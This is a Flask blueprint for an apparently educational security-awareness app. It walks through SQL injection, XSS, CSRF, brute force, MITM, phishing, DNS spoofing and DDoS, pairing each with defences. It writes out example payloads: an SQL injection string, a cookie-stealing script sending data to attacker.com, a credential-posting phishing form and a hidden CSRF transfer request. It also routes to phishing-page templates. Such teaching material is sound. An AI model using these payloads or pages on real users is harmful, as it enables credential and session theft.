from flask import Blueprint, render_template, request, jsonify
from flask_login import login_required

simulation_bp = Blueprint('simulation', __name__)

SIMULATIONS = {
    'sql_injection': {
        'title': 'SQL Injection Demo',
        'description': 'Learn how SQL injection attacks work and how to prevent them.',
        'steps': [
            {'title': 'Vulnerable Query', 'code': "SELECT * FROM users WHERE username='{input}' AND password='{pass}'", 'explanation': 'This query directly embeds user input — dangerous!'},
            {'title': 'Attacker Input', 'code': "' OR '1'='1' --", 'explanation': 'Attacker injects SQL that makes the condition always true.'},
            {'title': 'Resulting Query', 'code': "SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''", 'explanation': 'The -- comments out the password check, granting access.'},
            {'title': 'Safe Query (Parameterized)', 'code': "cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, password))", 'explanation': 'Parameters are never treated as SQL code — always use this!'},
        ]
    },
    'xss': {
        'title': 'Cross-Site Scripting (XSS) Demo',
        'description': 'Understand how XSS attacks inject malicious scripts.',
        'steps': [
            {'title': 'Vulnerable Code', 'code': 'document.getElementById("greeting").innerHTML = "Hello " + user_input;', 'explanation': 'Directly inserting user input into HTML is dangerous.'},
            {'title': 'Attacker Payload', 'code': '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>', 'explanation': 'Script steals the victim\'s cookies and sends to attacker.'},
            {'title': 'Safe Alternative', 'code': 'document.getElementById("greeting").textContent = "Hello " + user_input;', 'explanation': 'Using textContent instead of innerHTML prevents script injection.'},
        ]
    },
    'csrf': {
        'title': 'CSRF Attack Demo',
        'description': 'See how CSRF tricks users into unwanted actions.',
        'steps': [
            {'title': 'Victim is Logged In', 'code': '# User is authenticated at bank.com', 'explanation': 'User has an active session with their bank.'},
            {'title': 'Malicious Page', 'code': '<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">', 'explanation': 'Hidden request triggers bank transfer using victim\'s session.'},
            {'title': 'CSRF Protection', 'code': '<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">', 'explanation': 'CSRF tokens ensure requests originate from the legitimate site.'},
        ]
    },
    'brute_force': {
        'title': 'Brute Force Attack Demo',
        'description': 'Understand how password brute force works.',
        'steps': [
            {'title': 'Simple Attack', 'code': 'for password in wordlist:\n    if try_login(username, password):\n        print(f"Found: {password}")', 'explanation': 'Attacker tries every password in a list until one works.'},
            {'title': 'Defense: Account Lockout', 'code': 'if failed_attempts >= 5:\n    lock_account(username, duration=300)', 'explanation': 'Lock account after N failed attempts to slow down brute force.'},
            {'title': 'Defense: Rate Limiting', 'code': '@limiter.limit("5 per minute")\ndef login():\n    ...', 'explanation': 'Rate limiting prevents rapid automated login attempts.'},
        ]
    },
    'mitm': {
        'title': 'Man-in-the-Middle (MITM) Visualization',
        'description': 'Visual demonstration of how MITM interception works.',
        'steps': [
            {'title': 'Normal Communication', 'code': 'Alice <--HTTPS--> Server', 'explanation': 'Encrypted HTTPS protects communication.'},
            {'title': 'MITM Attack on HTTP', 'code': 'Alice <--HTTP--> ATTACKER <--HTTP--> Server', 'explanation': 'On unencrypted HTTP, attacker intercepts everything.'},
            {'title': 'ARP Poisoning', 'code': 'attacker sends: "192.168.1.1 is at AA:BB:CC:DD (attacker MAC)"', 'explanation': 'ARP poisoning redirects local traffic through the attacker.'},
            {'title': 'Defense', 'code': '# Always use HTTPS\n# VPN on public WiFi\n# Certificate pinning', 'explanation': 'HTTPS, VPNs, and certificate pinning prevent MITM attacks.'},
        ]
    },
    'phishing': {
        'title': 'Phishing Simulation',
        'description': 'Educational demonstration of phishing page characteristics.',
        'steps': [
            {'title': 'Fake Login Page', 'code': '<!-- Fake page looks identical to real login -->\n<form action="https://attacker.com/steal" method="POST">', 'explanation': 'Phishing pages copy legitimate site design to steal credentials.'},
            {'title': 'URL Tricks', 'code': 'https://paypa1.com/login  (1 instead of l)\nhttps://paypal.evil.com/login  (subdomain trick)', 'explanation': 'Attackers use typosquatting or subdomains to appear legitimate.'},
            {'title': 'Email Lure', 'code': 'From: security@paypai.com\nSubject: URGENT: Your account is suspended!', 'explanation': 'Phishing emails create urgency and use spoofed sender addresses.'},
        ]
    },
    'dns_spoofing': {
        'title': 'DNS Spoofing Visualization',
        'description': 'How DNS cache poisoning redirects users to malicious sites.',
        'steps': [
            {'title': 'Normal DNS', 'code': 'User asks: "What is the IP of bank.com?"\nDNS responds: "192.0.2.1 (real server)"', 'explanation': 'DNS translates domain names to IP addresses.'},
            {'title': 'Poisoned DNS', 'code': 'Attacker injects: bank.com = 10.0.0.99 (fake server)\nUser visits fake server — credentials stolen!', 'explanation': 'Poisoned DNS cache redirects users to attacker-controlled server.'},
            {'title': 'Defense: DNSSEC', 'code': 'DNSSEC adds cryptographic signatures to DNS records\nForged responses are rejected', 'explanation': 'DNSSEC validates DNS responses preventing cache poisoning.'},
        ]
    },
    'ddos': {
        'title': 'DDoS Attack Visualization',
        'description': 'Visual demonstration of Distributed Denial of Service attacks.',
        'steps': [
            {'title': 'Botnet Formation', 'code': '# Millions of infected devices become bots\n# Attacker C&C server controls them all', 'explanation': 'DDoS uses thousands of compromised machines (botnet).'},
            {'title': 'Flood Attack', 'code': '# 100,000 bots each send 1000 req/sec\n# = 100,000,000 requests/sec to target!', 'explanation': 'Flood of traffic overwhelms server resources.'},
            {'title': 'Defense Layers', 'code': '# CDN absorbs traffic\n# Rate limiting blocks suspicious IPs\n# Anycast routing distributes load', 'explanation': 'Multiple layers: CDN, rate limiting, traffic scrubbing, anycast.'},
        ]
    },
}


@simulation_bp.route('/')
@login_required
def index():
    return render_template('simulation/index.html', simulations=SIMULATIONS)


@simulation_bp.route('/<sim_type>')
@login_required
def demo(sim_type):
    if sim_type not in SIMULATIONS:
        return render_template('errors/404.html'), 404
    sim = SIMULATIONS[sim_type]
    return render_template('simulation/demo.html', sim=sim, sim_type=sim_type)


@simulation_bp.route('/phone-hacking')
@login_required
def phone_hacking():
    return render_template('simulation/phone_hacking.html')


@simulation_bp.route('/phishing-pages/<page_type>')
@login_required
def phishing_page(page_type):
    pages = ['login', 'bank', 'social_media', 'shopping', 'lottery', 'courier', 'investment', 'crypto', 'upi']
    if page_type not in pages:
        return render_template('errors/404.html'), 404
    return render_template(f'simulation/phishing/{page_type}.html')


@simulation_bp.route('/api/simulations')
@login_required
def list_simulations():
    return jsonify({k: {'title': v['title'], 'description': v['description']} for k, v in SIMULATIONS.items()})
